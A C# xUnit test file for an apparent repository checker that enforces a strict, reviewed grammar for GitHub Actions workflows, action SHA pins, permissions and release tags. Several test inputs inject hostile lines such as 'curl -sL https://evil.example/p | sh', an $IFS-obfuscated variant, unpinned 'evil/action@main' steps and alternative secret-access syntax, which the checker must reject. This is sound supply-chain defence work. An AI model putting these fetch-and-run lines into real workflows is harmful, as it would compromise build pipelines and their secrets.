using System.Text.Json;
using System.Text.Json.Nodes;
using Moonlark.Native.Engineering.Core;
using Moonlark.Native.Engineering.Repository;
using Moonlark.Native.Engineering.Tests.TestSupport;
using Xunit;

namespace Moonlark.Native.Engineering.Tests.Repository;

/// <summary>Family identity and the closed, source-only workflow grammar.</summary>
public sealed class RepositoryCheckTests
{
    /// <summary>The current repository satisfies every check.</summary>
    [Fact]
    public void CurrentRepositoryPasses() => Assert.Null(RepositoryCheck.Run(TestRepository.Root, null));

    /// <summary>Tags cannot misstate the family version or tool revision.</summary>
    [Theory]
    [InlineData("libchdr-v0.3.0")]
    [InlineData("libchdr-native-v1.0.0-preview.1")]
    [InlineData("chdman-0.289-r2")]
    [InlineData("other")]
    public void TagsCannotMisstateTheFamilyOrToolRevision(string tag) =>
        Assert.NotNull(RepositoryCheck.ValidateTag(tag, "1.0.0-preview.1", Mame()));

    /// <summary>The exact family and tool tags pass.</summary>
    [Theory]
    [InlineData("libchdr-v1.0.0-preview.1")]
    [InlineData("chdman-0.289-r1")]
    public void ActualFamilyAndToolTagsPass(string tag) => Assert.Null(RepositoryCheck.ValidateTag(tag, "1.0.0-preview.1", Mame()));

    /// <summary>Pin drift and write permissions fail closed.</summary>
    [Fact]
    public void SourcePinAndPermissionDriftFailClosed()
    {
        using var directory = Copy();
        string pinPath = Path.Combine(directory.Path, Authorities.PinPath);
        string original = File.ReadAllText(pinPath);
        JsonObject pin = JsonNode.Parse(original)!.AsObject();
        pin["commit"] = new string('0', 40);
        File.WriteAllText(pinPath, pin.ToJsonString());
        Assert.Contains("commit mismatch", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
        File.WriteAllText(pinPath, original);
        Replace(directory, "release.yml", "contents: read", "contents: write");
        Assert.NotNull(RepositoryCheck.Run(directory.Path, null));
    }

    /// <summary>Actions must be pinned to reviewed full SHAs.</summary>
    [Fact]
    public void MutableActionTagIsRejected()
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", RepositoryCheck.Actions["actions/checkout"], "v7");
        Assert.Contains("unreviewed action", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Each unsupported form fails on its own check: flow mapping, flow sequence, extra workflow, flow step.</summary>
    [Theory]
    [InlineData("ci.yml", "    env:\n      CI: true\n", "    env: {CI: true}\n", "flow mappings are unsupported")]
    [InlineData("ci.yml", "    steps:\n", "    steps: [uses: evil/action@main, run: curl -sL https://evil.example/p | sh]\n", "flow sequences are unsupported")]
    [InlineData("ci.yml", "      - run: dotnet tool restore\n", "      - {uses: unknown/action@main}\n", "flow mappings are unsupported")]
    [InlineData("release.yml", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions: {contents: write}\n", "flow mappings are unsupported")]
    public void UnsupportedYamlFormsCannotBypassReview(string workflow, string original, string replacement, string message)
    {
        using var directory = Copy();
        Replace(directory, workflow, original, replacement);
        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>An additional workflow file is outside the reviewed inventory.</summary>
    [Fact]
    public void ExtraWorkflowIsRejected()
    {
        using var directory = Copy();
        File.WriteAllText(Path.Combine(directory.Path, ".github/workflows/publish.yaml"), "name: Publish\npermissions: write-all\n");
        Assert.Contains("unexpected foundation workflow", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>YAML line breaks other than LF cannot hide permissions, actions or commands on one physical line.</summary>
    [Theory]
    [InlineData("\r")]
    [InlineData("\u0085")]
    [InlineData("\u2028")]
    [InlineData("\u2029")]
    [InlineData("\t")]
    public void NonLineFeedTerminatorsCannotHideEntries(string terminator)
    {
        foreach (string hidden in (string[])[
            "    timeout-minutes: 10" + terminator + "    permissions: write-all\n",
            "    # reviewed comment" + terminator + "    permissions: write-all\n    timeout-minutes: 10\n",
            "        with:\n          persist-credentials: false" + terminator + "      - uses: evil/action@main" + terminator + "      - run: curl -sL https://evil.example/p | sh\n"])
        {
            using var directory = Copy();
            string original = hidden.Contains("with:", StringComparison.Ordinal) ? "        with:\n          persist-credentials: false\n" : "    timeout-minutes: 10\n";
            Replace(directory, "release.yml", original, hidden);
            Assert.Contains("only LF-terminated printable ASCII", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
        }
    }

    /// <summary>Lines a YAML parser would fold into a reviewed run value are refused.</summary>
    [Theory]
    [InlineData("          name:;curl$IFS-sL$IFS\"https://evil.example/q\"|sh\n", "unsupported skeleton YAML form")]
    [InlineData("          name: ;curl -sL https://evil.example/q | sh\n", "continuation lines are unsupported")]
    public void ContinuationLinesCannotExtendReviewedCommands(string continuation, string message)
    {
        using var directory = Copy();
        const string run = "      - run: dotnet restore Moonlark.Native.slnx --locked-mode\n";
        Replace(directory, "release.yml", run, run + continuation);
        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Triggers, runners, checkout options and other values are exact reviewed values.</summary>
    [Theory]
    [InlineData("release.yml", "on:\n  workflow_dispatch:\n", "on: [workflow_dispatch, pull_request_target, workflow_run]\n", "flow sequences are unsupported")]
    [InlineData("release.yml", "on:\n", "on: workflow_run\n", "on must be a block mapping")]
    [InlineData("release.yml", "runs-on: ubuntu-24.04", "runs-on: self-hosted", "unreviewed value for runs-on")]
    [InlineData("release.yml", "persist-credentials: false", "persist-credentials: true", "unreviewed value for persist-credentials")]
    [InlineData("ci.yml", "submodules: true", "submodules: recursive", "unreviewed value for submodules")]
    [InlineData("ci.yml", "fetch-depth: 0", "fetch-depth: 1", "unreviewed value for fetch-depth")]
    [InlineData("ci.yml", "    branches: [main]", "    branches: [main, release]", "flow sequences are unsupported")]
    [InlineData("release.yml", "timeout-minutes: 10", "timeout-minutes: 600", "unreviewed value for timeout-minutes")]
    public void ValuesAreExactReviewedValues(string workflow, string original, string replacement, string message)
    {
        using var directory = Copy();
        Replace(directory, workflow, original, replacement);
        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Tag routing cannot gate any other step or job, so the drift check always runs on pull requests.</summary>
    [Theory]
    [InlineData("    runs-on: macos-15\n", "    runs-on: macos-15\n    if: github.ref_type == 'tag'\n")]
    [InlineData("      - run: " + RepositoryCheck.DriftCheck + "\n", "      - run: " + RepositoryCheck.DriftCheck + "\n        if: github.ref_type == 'tag'\n")]
    public void DriftCheckCannotBeGatedToTags(string original, string replacement)
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", original, replacement);
        Assert.Contains("tag routing is allowed only on the tag-check step", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Publishing command spellings with intervening options are still recognized.</summary>
    [Theory]
    [InlineData("name: git -C . push")]
    [InlineData("name: gh -R x release create")]
    [InlineData("name: dotnet nuget --source x push")]
    public void PublishingCommandVariantsAreRejected(string line)
    {
        using var directory = Copy();
        Replace(directory, "release.yml", "name: Release source preflight", line);
        Assert.Contains("publishing commands require approval", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>CI must keep the actual tag trigger.</summary>
    [Fact]
    public void ActualTagTriggerCannotDisappear()
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", "    tags: ['libchdr-*', 'chdman-*']\n", "");
        Assert.Contains("actual library/tool tag", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Secrets cannot be reached through alternative expression syntax.</summary>
    [Theory]
    [InlineData("${{ secrets['PUBLISH_TOKEN'] }}")]
    [InlineData("${{ format('{0}', secrets.PUBLISH_TOKEN) }}")]
    public void SecretsCannotBeReferencedWithAlternativeExpressionSyntax(string expression)
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", "CI: true", "CI: " + expression);
        Assert.NotNull(RepositoryCheck.Run(directory.Path, null));
    }

    /// <summary>Commented routing lines are not active evidence.</summary>
    [Theory]
    [InlineData("    tags: ['libchdr-*', 'chdman-*']", "actual library/tool tag")]
    [InlineData("        if: github.ref_type == 'tag'", "actual library/tool tag")]
    [InlineData("          EXPECTED_TAG: ${{ github.ref_name }}", "actual library/tool tag")]
    [InlineData("      - run: dotnet run --project eng/Moonlark.Native.Engineering -c Release --no-build -- repo check --tag \"$EXPECTED_TAG\"", "tag routing is allowed only on the tag-check step")]
    public void CommentedTagRoutingIsNotActiveEvidence(string line, string message)
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", line, "#" + line);
        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>The generation drift check cannot be removed or commented out of CI.</summary>
    [Theory]
    [InlineData("")]
    [InlineData("#")]
    public void GenerationDriftCheckCannotDisappear(string prefix)
    {
        using var directory = Copy();
        string line = "      - run: " + RepositoryCheck.DriftCheck + "\n";
        Replace(directory, "ci.yml", line, prefix.Length == 0 ? "" : prefix + line);
        Assert.Contains("generation drift check", RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Retired Python commands and the Python setup action are no longer reviewed CI inputs.</summary>
    [Theory]
    [InlineData("      - run: dotnet test tests/Moonlark.Native.Engineering.Tests -c Release --no-build --no-restore\n", "      - run: python3 -B eng/check.py\n", "unreviewed source command")]
    [InlineData("      - run: dotnet tool restore\n", "      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97\n", "unreviewed action")]
    public void RetiredPythonToolingIsRejected(string original, string replacement, string message)
    {
        using var directory = Copy();
        Replace(directory, "ci.yml", original, original + replacement);
        Assert.Contains(message, RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    /// <summary>Opt-in production remains behind the unchanged source preflight and never publishes.</summary>
    [Fact]
    public void ChdmanCandidateIsManualAndOptIn()
    {
        string text = File.ReadAllText(Path.Combine(TestRepository.Root, ".github/workflows/native-chdman.yml"));
        Assert.Contains("  workflow_dispatch:\n    inputs:\n      build_linux_x64:", text, StringComparison.Ordinal);
        Assert.Contains("        type: boolean\n        default: false\n", text, StringComparison.Ordinal);
        Assert.Contains("    needs: source\n    if: github.repository == 'MoonlarkStudios/romd-native' && github.event_name == 'workflow_dispatch' && inputs.build_linux_x64\n", text, StringComparison.Ordinal);
        Assert.Contains("--jobs 1 --sdl-include /inputs/sdl/include", text, StringComparison.Ordinal);
        Assert.Contains("          name: chdman-linux-x64-unqualified-${{ github.run_id }}-${{ github.run_attempt }}", text, StringComparison.Ordinal);
        Assert.DoesNotContain("  pull_request:", text, StringComparison.Ordinal);
        Assert.DoesNotContain("  push:", text, StringComparison.Ordinal);
        Assert.DoesNotContain("attest-build-provenance", text, StringComparison.Ordinal);
        Assert.Null(RepositoryCheck.Run(TestRepository.Root, null));
    }

    /// <summary>The exact candidate review rejects independent opt-in, recipe, containment and publication drift.</summary>
    [Theory]
    [InlineData("        default: false", "        default: true")]
    [InlineData(" && inputs.build_linux_x64", "")]
    [InlineData("    needs: source\n", "")]
    [InlineData("    runs-on: ubuntu-24.04\n    timeout-minutes: 75", "    runs-on: ubuntu-24.04-arm\n    timeout-minutes: 75")]
    [InlineData("  contents: read", "  contents: write")]
    [InlineData("persist-credentials: false", "persist-credentials: true")]
    [InlineData("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "actions/upload-artifact@main")]
    [InlineData("          retention-days: 7", "          retention-days: 90")]
    [InlineData("--network none", "--network host")]
    [InlineData("--cap-drop ALL", "--cap-add ALL")]
    [InlineData("--jobs 1", "--jobs 4")]
    [InlineData(" --sdl-include /inputs/sdl/include", "")]
    [InlineData("5f5993c530f084535c65a6879e9b26ad441169b3e25d789d83287040a9ca5165", "1f5993c530f084535c65a6879e9b26ad441169b3e25d789d83287040a9ca5165")]
    [InlineData(".Config.Labels[\"moonlark.chdman.owner\"] == $token", ".Config.Labels[\"moonlark.chdman.owner\"] != $token")]
    [InlineData("docker rm \"$cid\"", "docker rm --force \"$cid\"")]
    [InlineData("--mount \"type=bind,source=$p/outputs,target=/repo/artifacts/chdman-ci/outputs\"", "--mount \"type=bind,source=$GITHUB_WORKSPACE/artifacts,target=/repo/artifacts\"")]
    [InlineData(" || receipt=$?", "")]
    public void ChdmanCandidateDriftRequiresReview(string original, string replacement)
    {
        using var directory = Copy();
        Replace(directory, "native-chdman.yml", original, replacement);
        Assert.Contains("native-chdman.yml differs from the reviewed manual candidate workflow",
            RepositoryCheck.Run(directory.Path, null)!.Message, StringComparison.Ordinal);
    }

    private static TemporaryDirectory Copy()
    {
        var directory = new TemporaryDirectory();
        TestRepository.CopyTo(directory.Path, "eng/pins", "eng/versions", ".github/workflows");
        return directory;
    }

    private static void Replace(TemporaryDirectory directory, string workflow, string original, string replacement)
    {
        string path = Path.Combine(directory.Path, ".github/workflows", workflow);
        string text = File.ReadAllText(path);
        Assert.Contains(original, text, StringComparison.Ordinal);
        File.WriteAllText(path, text.Replace(original, replacement, StringComparison.Ordinal));
    }

    private static JsonElement Mame() => JsonDocument.Parse("{\"version\": \"0.289\", \"rebuildRevision\": 1}").RootElement;
}
